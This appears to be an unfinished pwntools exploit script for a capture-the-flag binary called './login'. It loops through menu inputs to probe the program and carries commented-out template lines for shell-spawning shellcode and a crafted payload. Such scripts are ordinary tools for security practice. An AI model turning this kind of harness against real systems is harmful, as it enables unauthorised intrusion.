#!/usr/bin/env python3

from pwn import *

# Set up pwntools for the correct architecture
# context.update(arch='i386')
exe = './login'

context.terminal = ['gnome-terminal', '--command']
# context.terminal = ["tmux", "splitw", "-v"]


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()
# io.recvuntil('> ')


for i in range(1000):

	io.sendline('1')
	print(io.recvline())
	io.sendline('24')
	print(io.recvline())
	io.sendline(str(i))
	# print(io.recvline())
	io.recvuntil('> ')
	io.sendline('2')
	io.recvline()
	io.sendline(str(i))
	print(io.recvline())
	print('i:',i)

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

